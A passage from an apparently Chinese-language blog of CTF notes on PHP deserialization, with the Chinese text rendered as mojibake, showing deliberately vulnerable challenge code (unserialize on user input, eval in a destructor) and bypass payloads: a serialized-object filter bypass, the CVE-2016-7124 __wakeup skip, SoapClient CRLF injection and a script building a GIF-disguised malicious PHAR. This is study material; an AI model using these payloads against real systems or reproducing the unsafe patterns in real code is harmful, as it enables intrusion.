class="variable">$cb</span>(<span class="variable">$arg</span>);               <span class="comment">// ä¹Ÿå¯å†™ ($cb)($arg);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3) æœ¬è´¨ç­‰åŒäº</span></span><br><span class="line"><span class="variable">$d</span>-&gt;<span class="title function_ invoke__">hi</span>(<span class="variable">$arg</span>);            <span class="comment">// ç›´æ¥æ–¹æ³•è°ƒç”¨</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;construct&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include_once</span>(<span class="variable language_">$this</span>-&gt;file);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;destruct&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wakeup&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;index.php&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Are you daydreaming?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>åºåˆ—æ ¼å¼åŒ–è¿‡æ»¤ç»•è¿‡ï¼š<ol><li>åœ¨<code>preg_match(&#39;/[oc]:\d+:/i&#39;,$cmd</code>ä¸­ï¼Œåœ¨æ•°å­—å‰é¢åŠ ä¸Š<code>+</code>ï¼Œ<code>O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code>.</li><li>åœ¨ PHP çš„åºåˆ—åŒ–è¯­æ³• é‡Œï¼Œæ‰€æœ‰ç”¨æ•°å­—è¡¨ç¤ºé•¿åº¦æˆ–æ•°é‡çš„å­—æ®µå…¶å®éƒ½è¢«å½“æˆ â€œC-é£æ ¼æ•´æ•°â€ æ¥è§£æâ€”â€”ä¹Ÿå°±æ˜¯è¯´ï¼Œå‰é¢å‡ºç°ä¸€ä¸ª + æˆ– - å·ï¼Œunserialize() ä»ä¼šæŠŠå®ƒæ­£ç¡®åœ°è½¬æ¢æˆæ•´æ•°å€¼ã€‚â€œ+â€ ä¸ä¼šæ”¹å˜å®é™…é•¿åº¦æ ¡éªŒã€‚</li></ol></li><li>CVE-2016-7124 æ¼æ´ï¼š<ol><li>PHP 5.6.0 â€“ 5.6.24 å’Œ 7.0.0 â€“ 7.0.9 åœ¨æ‰§è¡Œ unserialize() æ—¶ï¼Œå¦‚æœååºåˆ—åŒ–è¿‡ç¨‹ é€”ä¸­å¤±è´¥ï¼ˆå…¸å‹åœºæ™¯ï¼šå±æ€§æ•°é‡ä¸çœŸå®ä¸ç¬¦ã€å¾ªç¯å¼•ç”¨è§£æå‡ºé”™ç­‰ï¼‰ï¼Œå°±ä¼šææ—©è¿”å›è€Œ ä¸å†è°ƒç”¨ <strong>wakeup()â€”â€”ä½†æ­¤æ—¶å¯¹è±¡å·²ç»è¢«åˆ›å»ºè¿›å†…å­˜å¹¶æœ€ç»ˆä¼šè¢«ææ„ï¼Œä»è€Œè§¦å‘</strong>destruct()ã€‚ä¾èµ– __wakeup() åšå®‰å…¨æ£€æŸ¥ã€æƒé™æ ¡éªŒã€å±æ€§æ¸…ç†çš„åº”ç”¨ä¼šè¢«ç»•è¿‡ï¼Œå¯¼è‡´ ä»»æ„é­”æœ¯æ–¹æ³•è°ƒç”¨ã€è¿œç¨‹ä»£ç æ‰§è¡Œæˆ–æ‹’ç»æœåŠ¡ã€‚</li></ol></li></ol><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$comm</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$com</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;comm = <span class="variable">$com</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;comm;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;comm);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;%&quot;</span>,<span class="string">&quot;daydream&quot;</span>,<span class="variable">$param</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$param</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$param</span>);</span><br></pre></td></tr></table></figure><ol><li><code>private</code>å±æ€§ï¼š<ol><li>ç‰¹åˆ«çš„ï¼Œ å½“ä¸€ä¸ªå˜é‡ä¸ºç§æœ‰å˜é‡æ—¶ï¼Œ åºåˆ—åŒ–ä¹‹åä¼šåœ¨å˜é‡åçš„å¤´éƒ¨æ·»åŠ \00 ç±»å\00ï¼Œ ç”±äº\00 ä¸å¯è§ï¼Œ æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šå°±æ˜¯ç±»å+å˜é‡åï¼Œ ä½†æ˜¯è¯¥åç§°çš„é•¿åº¦ä¾ç„¶è®¡ç®—ä¸¤ä¸ª\00ï¼Œ æ‰€ä»¥åœ¨å®é™…åœºæ™¯ä¸­ï¼Œéœ€è¦æ³¨æ„é•¿åº¦å’Œåç§°æ˜¯å¦åŒ¹é…ã€‚</li><li>å¦‚æœå˜é‡ä¸º protectedï¼Œ ä¼šåœ¨å˜é‡åçš„å¤´éƒ¨æ·»åŠ \00*\00ã€‚</li><li>ä½¿ç”¨ urlencode()å¯ä»¥å¼•å…¥\00ï¼Œæˆ–è€…ä½¿ç”¨ burpsuite çš„<code>URLç¼–ç </code>åŠŸèƒ½ï¼ˆ%00ï¼‰ï¼ˆæœªéªŒè¯ï¼‰ã€‚</li></ol></li></ol><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">you</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$body</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pro</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$project</span>=<span class="variable language_">$this</span>-&gt;pro;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;body-&gt;<span class="variable">$project</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">my</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func</span> == <span class="string">&#x27;yourname&#x27;</span> <span class="keyword">and</span> <span class="variable language_">$this</span>-&gt;name == <span class="string">&#x27;myname&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><ol><li><code>__call($func, $args)</code> é­”æœ¯æ–¹æ³•ï¼š<ol><li>å½“è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®çš„å¯¹è±¡æ–¹æ³•æ—¶ï¼ŒPHP ä¼šè‡ªåŠ¨è°ƒç”¨ <code>__call()</code> æ–¹æ³•ã€‚</li><li><code>__call()</code> æ¥å—ä¸¤ä¸ªå‚æ•°ï¼šæ–¹æ³•åå’Œå‚æ•°æ•°ç»„ã€‚</li><li>ä¾‹å¦‚ï¼š<code>$obj-&gt;method($arg1, $arg2)</code> ä¼šè§¦å‘ <code>$obj-&gt;__call(&#39;method&#39;, [$arg1, $arg2])</code></li></ol></li></ol><h2 id="8-å­—ç¬¦ä¸²ç¼©çŸ­-å¢é•¿é€ƒé€¸"><a href="#8-å­—ç¬¦ä¸²ç¼©çŸ­-å¢é•¿é€ƒé€¸" class="headerlink" title="8 å­—ç¬¦ä¸²ç¼©çŸ­&#x2F;å¢é•¿é€ƒé€¸"></a>8 å­—ç¬¦ä¸²ç¼©çŸ­&#x2F;å¢é•¿é€ƒé€¸</h2><p>ä¸ºä»€ä¹ˆä¸ç›´æ¥ç”¨</p><blockquote><p><code>var $pass=&#39;escaping&#39;;</code></p></blockquote><p>F12 æ§åˆ¶å°å¯è§</p><h2 id="9-åµŒå¥—æ„é€ "><a href="#9-åµŒå¥—æ„é€ " class="headerlink" title="9 åµŒå¥—æ„é€ "></a>9 åµŒå¥—æ„é€ </h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¡®å®š<code>modifier-&gt;var</code>éœ€è¦ä¸º<code>flag.php</code>-&gt;é€šè¿‡<code>__invoke()</code>-&gt;<code>__get()</code>æ–¹æ³•è°ƒç”¨-&gt;<code>to_string()</code>-&gt;<code>__wakeup()</code></p><h2 id="10-SOAP"><a href="#10-SOAP" class="headerlink" title="10 SOAP"></a>10 SOAP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]);</span><br><span class="line"><span class="variable">$c</span> -&gt; <span class="title function_ invoke__">daydream</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">In this topic,it is of course possible to pass parameters directly to flag.php, but it is not recommended to use this method to learn SOAP.</span></span><br><span class="line"><span class="comment">flag.php</span></span><br><span class="line"><span class="comment">$flag=&quot;*&quot;;</span></span><br><span class="line"><span class="comment">$user=$_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span></span><br><span class="line"><span class="comment">$pass = $_POST[&#x27;pass&#x27;];</span></span><br><span class="line"><span class="comment">if(isset($pass) and isset($user))&#123;</span></span><br><span class="line"><span class="comment">    if($pass==&#x27;password&#x27; and $user==&#x27;admin&#x27;)&#123;</span></span><br><span class="line"><span class="comment">        file_put_contents(&#x27;flag.txt&#x27;,$flag);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åŸºç¡€çš„SOAPç»ƒä¹ ï¼Œé€šè¿‡ååºåˆ—åŒ–ä¸€ä¸ªå†…ç½®çš„ç±»<code>SoapClient</code>å®ç°æ”»å‡»ã€‚è°ƒç”¨æœ¬åœ°ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ï¼ŒSoapClient ä¼šå°† HTTP è¯·æ±‚å‘é€åˆ°æ‚¨æŒ‡å®šçš„ä½ç½®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, [</span><br><span class="line">    <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://example.com/service&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;myNamespace&#x27;</span></span><br><span class="line">]);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">daydream</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å°†å‘é€</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/service</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml; charset=utf-8</span><br><span class="line"><span class="attribute">SOAPAction</span><span class="punctuation">: </span>&quot;myNamespace#daydream&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æœ‰ä¸€ä¸ªå‚æ•°<code>user_agent</code>ï¼Œå¯ä»¥é€šè¿‡<code>\r\n</code>æˆªæ–­ä»è€Œå¢åŠ å‚æ•°ã€‚</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨é«˜ç‰ˆæœ¬çš„ PHP ä¸­ï¼Œç±»<code>SoapClient</code>çš„<code>uri</code>æ˜¯privateçš„ï¼Œè€Œä½ç‰ˆæœ¬æ˜¯publicçš„ã€‚è¿™ä¼šå¯¼è‡´ä¸åŒç‰ˆæœ¬åºåˆ—åŒ–ç”Ÿæˆçš„å­—ç¬¦ä¸²ä¸åŒå¯¼è‡´<code>Fatal error: Uncaught SoapFault exception: [Client] Error finding &quot;uri&quot; property</code>æŠ¥é”™ã€‚</p><h2 id="11-PHAR"><a href="#11-PHAR" class="headerlink" title="11 PHAR"></a>11 PHAR</h2><p>php.iniä¸­phar.readonly&#x3D;Offï¼ˆè‹¥æœ‰åˆ†å·åˆ™å»æ‰ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´æ¦‚å¿µ"><a href="#æ¼æ´æ¦‚å¿µ" class="headerlink" title="æ¼æ´æ¦‚å¿µ"></a>æ¼æ´æ¦‚å¿µ</h3><p><code>PHP</code> çš„ <code>phar://</code> æµåŒ…è£…å™¨å…è®¸ä½¿ç”¨æ™®é€šæ–‡ä»¶å‡½æ•°ï¼ˆ<code>md5_fileã€file_exists</code> ç­‰ï¼‰å°†æ–‡ä»¶ä½œä¸º <code>PHAR</code> å­˜æ¡£æ‰“å¼€ã€‚</p><p>å½“ <code>PHP</code> æ‰“å¼€ <code>PHAR</code> æ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨å–æ¶ˆåºåˆ—åŒ–å­˜æ¡£çš„å…ƒæ•°æ®ã€‚</p><p>å¦‚æœè¯¥å…ƒæ•°æ®åŒ…å«å…·æœ‰å±é™© <code>__destruct()</code> ï¼ˆæˆ–<code>__wakeup()</code>ï¼‰ çš„ç±»çš„å¯¹è±¡ï¼ŒPHP å°†æ‰§è¡Œè¯¥æ–¹æ³•â†’ä»£ç æ‰§è¡Œ&#x2F;æ ‡å¿—æ³„æ¼ã€‚</p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><ol><li>åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ä»£ç çš„ <code>PHAR</code> æ–‡ä»¶ã€‚</li><li>é€šè¿‡ <code>phar://</code> æµåŒ…è£…å™¨åŠ è½½è¯¥æ–‡ä»¶ã€‚</li><li>è§¦å‘ <code>__destruct()</code> æˆ– <code>__wakeup()</code> æ–¹æ³•ï¼Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚</li></ol><h3 id="æ„å»ºæ¶æ„-PHAR"><a href="#æ„å»ºæ¶æ„-PHAR" class="headerlink" title="æ„å»ºæ¶æ„ PHAR"></a>æ„å»ºæ¶æ„ PHAR</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar1.phar&quot;</span>);  <span class="comment">//åˆ é™¤ä»»ä½•æ—§çš„ PHAR</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar1.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//ç¼“å†²åŒºæ›´æ”¹</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);  <span class="comment">//è®¾ç½®å­˜æ ¹ ï¼šä»¥ GIF89aï¼ˆå‡å›¾ç‰‡æ ‡é¢˜ï¼‰+ __HALT_COMPILER(); å¼€å¤´ï¼Œç»•è¿‡ä¸Šä¼ è¿‡æ»¤å™¨ã€‚</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//å°†å…¶å­˜å‚¨åœ¨å…ƒæ•°æ®ä¸­</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//è‡³å°‘æ·»åŠ ä¸€ä¸ªæ–‡ä»¶æ¡ç›®</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();  <span class="comment">//æœ€ç»ˆç¡®å®š</span></span><br></pre></td></tr></table></figure><hr><p>ç”±äºé¢˜ç›®åŸå› å¯èƒ½è¦å…ˆè‡ªè¡Œåˆ›ç«‹ä¸€ä¸ªuploadæ–‡ä»¶å¤¹</p><h2 id="12-PHAR"><a href="#12-PHAR" class="headerlink" title="12 PHAR"></a>12 PHAR</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$black_list</span>=[<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;glob&#x27;</span>,<span class="string">&#x27;data&#x27;</span>,<span class="string">&#x27;http&#x27;</span>,<span class="string">&#x27;ftp&#x27;</span>,<span class="string">&#x27;zip&#x27;</span>,<span class="string">&#x27;https&#x27;</span>,<span class="string">&#x27;ftps&#x27;</span>,<span class="string">&#x27;phar&#x27;</span>];</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$black_list</span> <span class="keyword">as</span> <span class="variable">$item</span>)&#123;</span><br><span class="line">    <span class="variable">$front</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$filename</span>,<span class="number">0</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$item</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$front</span>==<span class="variable">$item</span>)&#123;</span><br><span class="line">        <span class="variable">$boo1</span>=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®åŒä¸Šï¼Œå¹¶å¼ºåˆ¶è¦æ±‚å­—ç¬¦ä¸²å¼€å¤´ä¸èƒ½æ˜¯ç›¸åº”å­—ç¬¦</p><h3 id="è§£æ³•ä¸€-å¤§å°å†™ç»•è¿‡"><a href="#è§£æ³•ä¸€-å¤§å°å†™ç»•è¿‡" class="headerlink" title="è§£æ³•ä¸€ å¤§å°å†™ç»•è¿‡"></a>è§£æ³•ä¸€ å¤§å°å†™ç»•è¿‡</h3><h3 id="è§£æ³•äºŒ-compress-zlib"><a href="#è§£æ³•äºŒ-compress-zlib" class="headerlink" title="è§£æ³•äºŒ compress.zlib://"></a>è§£æ³•äºŒ <code>compress.zlib://</code></h3><h4 id="1-åŸºæœ¬æ¦‚å¿µ"><a href="#1-åŸºæœ¬æ¦‚å¿µ" class="headerlink" 